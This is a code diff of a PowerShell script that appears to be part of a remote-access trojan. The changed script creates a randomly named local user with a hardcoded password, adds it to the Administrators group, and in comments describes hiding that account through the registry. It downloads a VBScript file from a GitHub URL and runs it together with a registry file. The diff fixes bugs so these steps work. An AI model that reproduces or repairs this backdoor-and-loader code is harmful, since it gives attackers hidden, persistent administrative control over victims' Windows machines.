@@ -23,7 +23,8 @@ function create_account {
      }
         process {
             New-LocalUser "$uname" -password $pword -FullName "$uname" -Description "Temporary local admin"
-            Write-Verbose "$uname local user crated" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+            Write-Verbose "$uname local user crated" 
+            Add-LocalGroupMember -Group "Administrators" -Member "$uname"
             
         }
         end{  
@@ -33,7 +34,7 @@ function create_account {
 
 #create admin user
 $uname = random_text
-$pword = (ConvertTo-SecureString "rat123"-AsPlainText -Force)
+$pword = (ConvertTo-SecureString "Rat@@123"-AsPlainText -Force)
 create_account  -uname $uname -password $pword
 
 #registry  to hide local admin
@@ -48,7 +49,8 @@ $vbs_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
+Start-Process "$reg_file.reg"
+Start-Process "$vbs_file.vbs"
 
 
 
